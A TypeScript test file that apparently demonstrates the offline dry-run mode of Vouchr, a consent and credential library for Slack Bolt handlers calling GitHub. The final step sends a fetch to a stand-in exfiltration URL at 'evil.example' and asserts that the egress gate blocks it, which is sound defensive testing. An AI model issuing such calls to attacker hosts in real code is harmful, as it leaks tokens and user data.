/**
 * examples/dry-run — test YOUR Bolt handler fully offline with `dryRun: true` (#116).
 *
 * No Slack app, no GitHub OAuth app, no network. The real machinery — consent state, channel
 * modes, policy, tool allowlists, egress gates, vault, audit — all runs; no real network call
 * leaves the process on any edge (outbound fetch, token exchange, refresh, revoke). The things
 * you actually want CI to catch — a host missing from `egressAllow`, mishandled consent control
 * flow — fail here exactly as they would in production.
 *
 * Run: npm run example:dry-run   (or: node --import tsx --test examples/dry-run/app.test.ts)
 */
import { test } from 'node:test';
// Repo-internal helper (not shipped in the npm package): in YOUR repo, replace this with a
// database URL pointing at a fresh, dedicated PostgreSQL schema for the dry run.
import { testDbUrl } from '../../test/support/pg';
import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import { createVouchr, github, ConsentRequiredError } from '../../src';

// Vouchr's at-rest encryption key — any random 32 bytes will do in a test.
process.env.VOUCHR_MASTER_KEY ??= randomBytes(32).toString('base64');

// ── The handler under test: the same shape as examples/bolt-github/app.ts ──────────────────────
async function handleMention({ context, event, client }: any): Promise<void> {
  try {
    const gh = await context.vouchr.connect('github');
    const res = await gh.fetch('https://api.github.com/user'); // token injected inside Vouchr
    const body: any = await res.json();
    await client.chat.postMessage({ channel: event.channel, text: `GitHub replied: ${JSON.stringify(body)}` });
  } catch (e) {
    if (e instanceof ConsentRequiredError) return; // Vouchr already posted the Connect prompt
    throw e;
  }
}

test('dry-run example: consent prompt, programmatic connect, real egress gates, echo response', async (t) => {
  const vouchr = await createVouchr({
    dryRun: true, // ← the only change vs production wiring
    providers: [github({ clientId: 'dry-run', clientSecret: 'dry-run' })], // dummies — no OAuth app
    baseUrl: 'https://my-app.test', // never contacted in dry-run
    databaseUrl: await testDbUrl(t),
  });

  // Drive the middleware exactly as Bolt would, with a capturing fake client.
  const posts: any[] = [];
  const client = {
    chat: {
      postEphemeral: async (m: any) => posts.push(m),
      postMessage: async (m: any) => posts.push(m),
    },
  };
  const args: any = { context: {}, client, event: { channel: 'C1', user: 'U1', team: 'T1' }, next: async () => {} };
  await vouchr.middleware(args);

  // 0. Deny-by-default: an admin opts the provider into this channel first — in production that's
  //    `/vouchr enable github` (or the App Home toggle). Without it, the first connect() is refused
  //    with ToolDisabledError before any consent flow. (DMs are exempt and need no enable.)
  await vouchr.dryRun!.enableTool({ enterpriseId: null, teamId: 'T1', userId: 'U_ADMIN' }, 'C1', 'github');

  // 1. First mention: not connected yet → the handler stops; the REAL Connect prompt was posted.
  await handleMention(args);
  assert.ok(posts.some((p) => /Connect your github account/.test(p.text)));

  // 2. The user "clicks Connect": complete the pending consent programmatically instead.
  await vouchr.dryRun!.completeConsent('U1', 'github');

  // 3. Second mention: the fetch passes every real gate, then returns the dry-run echo.
  posts.length = 0;
  await handleMention(args);
  assert.match(posts[0].text, /"dryRun":true/);
  assert.match(posts[0].text, /"wouldInjectAs":"authorization: Bearer <redacted>"/);

  // 4. Denials are REAL: a host outside github's egress allowlist throws in dry-run too — this is
  //    how CI catches an allowlist mistake before any production credential exists.
  const gh = await args.context.vouchr.connect('github');
  await assert.rejects(() => gh.fetch('https://evil.example/exfil'), /Egress blocked/);
});
